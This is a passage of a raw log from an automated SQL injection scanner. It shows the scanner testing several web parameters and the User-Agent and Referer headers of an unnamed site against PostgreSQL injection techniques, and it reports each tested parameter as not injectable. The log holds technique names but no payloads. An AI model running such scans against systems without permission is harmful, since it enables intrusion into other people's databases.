[14:00:55] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[14:01:09] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:01:58] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[14:02:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[14:03:05] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[14:03:23] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[14:04:10] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[14:04:32] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[14:04:58] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[14:05:34] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[14:05:34] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[14:05:34] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[14:05:35] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[14:05:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:05:47] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[14:06:21] [WARNING] GET parameter 'fileName' does not seem to be injectable
[14:06:21] [INFO] testing if GET parameter 'portalid' is dynamic
[14:06:22] [WARNING] GET parameter 'portalid' does not appear to be dynamic
[14:06:22] [WARNING] heuristic (basic) test shows that GET parameter 'portalid' might not be injectable
[14:06:22] [INFO] testing for SQL injection on GET parameter 'portalid'
[14:06:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:06:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:07:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[14:08:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:08:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:09:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[14:09:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[14:09:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[14:09:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:09:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[14:09:48] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[14:09:48] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[14:09:48] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[14:09:48] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[14:10:11] [INFO] testing 'Generic inline queries'
[14:10:11] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:10:36] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:11:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[14:11:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[14:11:19] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[14:11:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[14:11:21] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[14:11:21] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[14:11:21] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[14:11:22] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[14:11:41] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[14:12:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:12:35] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[14:12:57] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[14:12:58] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[14:12:58] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[14:12:59] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[14:13:00] [INFO] testing 'PostgreSQL inline queries'
[14:13:01] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:13:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[14:13:48] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[14:14:00] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[14:14:23] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[14:14:34] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[14:15:12] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:15:40] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[14:16:09] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[14:16:24] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[14:16:54] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[14:17:31] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[14:18:14] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[14:18:51] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[14:19:14] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[14:19:14] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[14:19:14] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[14:19:15] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[14:19:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:20:09] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[14:20:49] [WARNING] GET parameter 'portalid' does not seem to be injectable
[14:20:49] [INFO] testing if GET parameter 'i' is dynamic
[14:20:50] [WARNING] GET parameter 'i' does not appear to be dynamic
[14:20:50] [WARNING] heuristic (basic) test shows that GET parameter 'i' might not be injectable
[14:20:51] [INFO] testing for SQL injection on GET parameter 'i'
[14:20:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:21:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:22:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[14:22:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:23:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:23:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[14:23:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[14:23:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[14:24:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:24:01] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[14:24:01] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[14:24:01] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[14:24:02] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[14:24:02] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[14:24:25] [INFO] testing 'Generic inline queries'
[14:24:25] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:24:50] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:25:34] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[14:25:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[14:25:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[14:25:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[14:25:35] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[14:25:36] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[14:25:36] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[14:25:44] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[14:25:54] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[14:26:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:26:40] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[14:27:13] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[14:27:13] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[14:27:13] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[14:27:14] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[14:27:15] [INFO] testing 'PostgreSQL inline queries'
[14:27:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:27:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[14:28:05] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[14:28:22] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[14:28:39] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[14:28:50] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[14:29:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:29:51] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[14:30:18] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[14:30:40] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[14:30:54] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[14:31:38] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[14:32:13] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[14:32:33] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[14:33:02] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[14:33:03] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[14:33:03] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[14:33:04] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[14:33:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:33:51] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[14:34:45] [WARNING] GET parameter 'i' does not seem to be injectable
[14:34:45] [INFO] testing if GET parameter 'q' is dynamic
[14:34:46] [WARNING] GET parameter 'q' does not appear to be dynamic
[14:34:46] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
[14:34:47] [INFO] testing for SQL injection on GET parameter 'q'
[14:34:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:35:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:36:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[14:36:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:36:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:37:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[14:37:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[14:37:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[14:38:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:38:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[14:38:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[14:38:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[14:38:06] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[14:38:06] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[14:38:42] [INFO] testing 'Generic inline queries'
[14:38:43] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:38:58] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:39:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[14:39:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[14:39:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[14:39:55] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[14:39:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[14:39:56] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[14:39:56] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[14:39:57] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[14:40:08] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[14:40:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:41:09] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[14:41:26] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[14:41:26] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[14:41:27] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[14:41:27] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[14:41:28] [INFO] testing 'PostgreSQL inline queries'
[14:41:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:41:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[14:42:05] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[14:42:23] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[14:42:40] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[14:42:58] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[14:43:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:44:16] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[14:44:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[14:45:10] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[14:45:47] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[14:46:17] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[14:46:53] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[14:47:33] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[14:47:54] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[14:47:55] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[14:47:55] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[14:47:56] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[14:47:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:48:51] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[14:49:46] [WARNING] GET parameter 'q' does not seem to be injectable
[14:49:46] [INFO] testing if GET parameter 's' is dynamic
[14:49:46] [INFO] GET parameter 's' appears to be dynamic
[14:49:47] [WARNING] heuristic (basic) test shows that GET parameter 's' might not be injectable
[14:49:48] [INFO] testing for SQL injection on GET parameter 's'
[14:49:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:51:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:52:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[14:53:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:54:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[14:54:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[14:54:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[14:54:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[14:54:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:54:49] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[14:54:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[14:54:50] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[14:54:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[14:54:51] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[14:55:51] [INFO] testing 'Generic inline queries'
[14:55:51] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:56:38] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:57:44] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[14:57:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[14:57:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[14:57:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[14:57:46] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[14:57:47] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[14:57:47] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[14:57:48] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[14:58:05] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[14:58:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:59:20] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[14:59:43] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[14:59:43] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[14:59:43] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[14:59:44] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[14:59:45] [INFO] testing 'PostgreSQL inline queries'
[14:59:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:00:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[15:00:37] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[15:00:53] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[15:01:15] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[15:01:32] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[15:01:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:02:25] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[15:03:04] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[15:03:23] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[15:03:36] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[15:04:18] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[15:04:49] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[15:05:09] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[15:05:20] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[15:05:20] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[15:05:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[15:05:22] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[15:05:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[15:05:49] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[15:06:02] [WARNING] GET parameter 's' does not seem to be injectable
[15:06:02] [INFO] testing if parameter 'User-Agent' is dynamic
[15:06:03] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[15:06:03] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[15:06:04] [INFO] testing for SQL injection on parameter 'User-Agent'
[15:06:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:06:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:07:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:08:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:08:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:09:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[15:09:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[15:09:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[15:09:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:09:23] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[15:09:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[15:09:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[15:09:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[15:09:25] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[15:09:47] [INFO] testing 'Generic inline queries'
[15:09:48] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[15:10:19] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[15:11:01] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[15:11:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[15:11:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[15:11:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[15:11:03] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[15:11:04] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[15:11:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[15:11:06] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[15:11:23] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[15:11:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:12:09] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[15:12:41] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[15:12:41] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[15:12:42] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[15:12:42] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[15:12:43] [INFO] testing 'PostgreSQL inline queries'
[15:12:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:12:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[15:13:42] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[15:14:06] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[15:14:30] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[15:14:40] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[15:14:58] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:15:28] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[15:16:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[15:16:32] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[15:16:54] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[15:17:21] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[15:17:54] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[15:18:17] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[15:18:52] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[15:18:53] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[15:18:53] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[15:18:54] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[15:18:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[15:19:27] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[15:20:25] [WARNING] parameter 'User-Agent' does not seem to be injectable
[15:20:25] [INFO] testing if parameter 'Referer' is dynamic
[15:20:25] [WARNING] parameter 'Referer' does not appear to be dynamic
[15:20:26] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[15:20:26] [INFO] testing for SQL injection on parameter 'Referer'
[15:20:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:20:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:21:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:22:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:22:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:23:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[15:23:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[15:23:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[15:23:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:23:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[15:23:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[15:24:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[15:24:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[15:24:01] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[15:24:39] [INFO] testing 'Generic inline queries'
[15:24:40] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[15:25:04] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[15:25:34] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[15:25:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[15:25:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[15:25:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[15:25:36] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[15:25:37] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[15:25:38] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[15:25:39] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[15:25:57] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[15:26:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:26:52] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[15:27:09] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[15:27:09] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[15:27:10] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[15:27:18] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[15:27:18] [INFO] testing 'PostgreSQL inline queries'
[15:27:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:27:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[15:28:09] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[15:28:34] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[15:29:13] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[15:29:23] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[15:29:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:30:17] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[15:30:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[15:31:28] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[15:31:50] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[15:32:14] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[15:32:48] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[15:33:10] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[15:33:25] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
